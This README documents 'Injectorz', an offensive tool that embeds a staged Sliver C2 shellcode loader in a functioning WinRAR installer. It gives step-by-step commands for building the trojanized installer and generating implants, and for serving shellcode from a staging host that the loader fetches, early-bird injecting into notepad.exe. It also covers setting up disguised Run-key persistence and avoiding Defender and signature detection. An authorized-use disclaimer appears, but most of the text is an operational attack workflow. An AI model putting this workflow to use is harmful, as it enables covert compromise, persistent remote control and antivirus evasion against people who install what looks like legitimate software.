# Injectorz – Staged Shellcode Loader for Sliver C2

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.8+-blue?logo=python)](https://python.org)
[![Nim](https://img.shields.io/badge/nim-2.0+-yellow?logo=nim)](https://nim-lang.org)
[![Status](https://img.shields.io/badge/status-production-green)](#)
[![Security](https://img.shields.io/badge/use-authorized_only-orange)](#-disclaimer)

> **Staged loader with automatic persistence for Sliver C2**
> Loader is injected into WinRAR installer. The wizard runs normally in the foreground while the implant works in the background via early bird injection. Persistence is set up directly from the session without needing access to the target.

---

## Disclaimer

This tool is built for **security research, lab environments, and authorized red team testing**.

Unauthorized use is illegal. By using this tool, you agree to:
- Only test systems you own or have written permission to test
- Comply with local and international cybersecurity laws
- Take full responsibility for the consequences of use

---

## Features

- Staged loader (fetch shellcode from staging server)
- Anti-sandbox (RAM check >= 1GB, no uptime check for logon-trigger compatibility)
- Early bird injection into notepad.exe (not self-inject)
- WinRAR installer remains fully functional
- Persistence via HKCU Run key (user-level, no admin required)
- Defender bypass (for lab environments)
- Single EXE deployment (4.4MB)

---

## Architecture

```
[Target Windows]
    |
    +-- winrar_installer.exe (user clicks)
          |
          +-- Extract WinRAR to %TEMP%
          +-- Run WinRAR wizard (foreground, UAC)
          +-- loader_embed.exe (background)
                |
                +-- Wait 9s (anti-sandbox)
                +-- Check RAM >= 1GB
                +-- Fetch http://STAGING:<STAGING_PORT>/shellc.bin
                +-- Early bird inject into notepad.exe
                +-- Exit
          |
          +-- Session appears in Sliver (process: Notepad.exe)

[Persistence Layer]
    |
    +-- HKCU\...\Run\WinRarUpdate
          |
          +-- C:\Users\<user>\AppData\Local\WinRar\WinRarUpdate.exe
                |
                +-- Trigger on user logon
                +-- Fetch shellc.bin (staging must be running)
                +-- Session returns to Sliver
```

---

## Prerequisites

```bash
# Nim compiler (to build loader)
sudo apt install nim

# Sliver C2 server
# Run on a server reachable from the target

# WinRAR installer
# Download from https://rarlab.com/rar/winrar-x64-624.exe
# Rename to winrar_x64.exe
```

---

## Files

```
build_loader.py       Build loader.exe + loader_embed.exe
build_installer.py    Inject loader_embed.exe into WinRAR installer
loader.exe            Standalone loader (test on target)
loader_embed.exe      Loader for installer (extracts embedded WinRAR)
winrar_x64.exe        Original WinRAR installer (download from rarlab.com)
winrar_installer.exe  Final payload ready to deploy
shellc.bin            Sliver shellcode (generate per deployment)
```

--- ---

## Placeholders

This documentation uses the following placeholders. Replace them with your actual values:

| Placeholder | Description | Example |
|-------------|-------------|---------|
| `<STAGING_IP>` | IP address of staging server | `192.168.1.100` |
| `<STAGING_PORT>` | Port for staging server | `9999` |
| `<C2_IP>` | IP address of Sliver C2 server | `192.168.1.100` |
| `<C2_PORT>` | Port for Sliver listener | `8080` |

**Note:** Staging server and C2 server can be the same machine. Use the same IP for both `<STAGING_IP>` and `<C2_IP>` if running on a single host.

---

## Complete Workflow

### 1. Build Loader

```bash
python3 build_loader.py --stager-ip <STAGING_IP> --stager-port <STAGING_PORT>
```

Example:
```bash
python3 build_loader.py --stager-ip <STAGING_IP> --stager-port <STAGING_PORT>
```

Output:
- `loader.exe` (523KB) - for standalone testing
- `loader_embed.exe` (528KB) - for installer injection

The loader will fetch `shellc.bin` from `http://<IP>:<PORT>/shellc.bin`

### 2. Generate Implant in Sliver

In Sliver console:
```bash
# Session (interactive, real-time)
generate --http <C2_IP>:<C2_PORT> --os windows --arch amd64 \
  --skip-symbols --format shellcode --save shellc.bin

# Or Beacon (callback interval, stealthier)
generate beacon --http <C2_IP>:<C2_PORT> --os windows --arch amd64 \
  --seconds 60 --jitter 30 --skip-symbols --format shellcode --save shellc.bin
```

Select encoder `none` when prompted.

Move `shellc.bin` to the injectorz folder:
```bash
mv /path/to/shellc.bin ~/tools/injectorz/
```

**IMPORTANT**: Generate a NEW implant for each deployment. Do not reuse the same shellcode to avoid signature-based detection.

### 3. Test Standalone Loader

Terminal 1 - staging server:
```bash
cd ~/tools/injectorz
python3 -m http.server <STAGING_PORT>
```

Terminal 2 - Sliver listener:
```bash
sliver
# in Sliver console:
http -L <C2_IP> -l 8080
```

Transfer `loader.exe` to the target and run it. Session should appear in Sliver within ~15-20 seconds.

### 4. Build Installer

```bash
python3 build_installer.py --installer winrar_x64.exe --output winrar_installer.exe
```

Output: `winrar_installer.exe` (4.4MB, single EXE ready to deploy)

### 5. Deploy Initial Access

Transfer `winrar_installer.exe` to the target, user double-clicks:

1. WinRAR wizard appears normally (foreground, UAC consent)
2. Background: loader extracts installer, fetches shellc.bin, early bird injects into notepad.exe
3. Session appears in Sliver with process `Notepad.exe`
4. Installer exits, session remains ALIVE in notepad

### 6. Setup Persistence

**DIRECTLY from the first session** (before doing anything else):

```bash
# Interact with session
sessions -i <SESSION_ID>

# Create persistence folder
mkdir "C:\\Users\\<user>\\AppData\\Local\\WinRar"

# Upload loader to persistence location
upload /home/heyrm/tools/injectorz/loader.exe "C:\\Users\\<user>\\AppData\\Local\\WinRar\\WinRarUpdate.exe"

# Set registry Run key
registry write --hive HKCU --type string \
  "software\\microsoft\\windows\\currentversion\\run\\WinRarUpdate" \
  "C:\\Users\\<user>\\AppData\\Local\\WinRar\\WinRarUpdate.exe"

# Verify
registry read --hive HKCU "software\\microsoft\\windows\\currentversion\\run\\WinRarUpdate"
```

Replace `<SESSION_ID>` and `<user>` according to the target.

**After persistence is set**:
- Session dies (reboot, crash, kill) → session returns automatically on logon
- No need to access the target again
- Staging server must remain running for shellcode fetch

### 7. Persistence Verification

Test persistence:
```bash
# From a live session:
execute shutdown /r /t 0

# Wait for target to reboot + logon (~2-3 minutes)
# New session should appear from WinRarUpdate.exe
sessions
```

Expected: new session appears with process `WinRarUpdate.exe` without manual execution.

---

## Deployment Checklist

### Before Deploy

- [ ] Build loader with correct staging IP
- [ ] Generate NEW implant in Sliver
- [ ] Ensure `shellc.bin` exists in injectorz folder
- [ ] Test standalone loader on target

### During Deploy

Terminal 1 - staging server (detached for persistence):
```bash
cd ~/tools/injectorz
nohup python3 -m http.server <STAGING_PORT> >/tmp/stager.log 2>&1 &
```

Terminal 2 - Sliver listener:
```bash
sliver
http -L <C2_IP> -l 8080
```

Terminal 3 - send payload:
```bash
# Transfer winrar_installer.exe to target via chosen method
```

### After Session Appears

- [ ] Immediately setup persistence (workflow step 6)
- [ ] Verify Run key is written
- [ ] Test reboot

---

## Troubleshooting

| Symptom | Cause | Solution |
|---------|-------|----------|
| No session, staging log empty | Loader cannot reach staging | Check compiled IP/port, firewall, ensure staging server is running |
| No session, log shows GET 200 | Wrong shellcode/implant | Regenerate with correct `--http <C2_IP>:<C2_PORT>` |
| No session after reboot | Run key missing / Defender quarantine | Re-setup persistence from live session |
| Loader detected by Defender | Hash is known | Generate NEW implant, rebuild loader |
| Session dies after installer closes | Self-inject (not early bird) | Ensure using latest loader_embed.exe |
| Persistence doesn't fire on logon | Staging server down | Start staging server before target logs on |

---

## Security Notes

- This tool is for lab/testing environments
- Staged loader requires staging server to ALWAYS be running
- Persistence via Run key is easily visible (user can check msconfig)
- For production red team: consider stealthier persistence methods (hidden scheduled task, service, WMI subscription)

---

## Credits
- [Sliver C2](https://github.com/BishopFox/sliver) - C2 framework
- [Nim](https://nim-lang.org/) - compiler for loader bypass defender

---

## License

MIT - for educational and authorized testing purposes only.
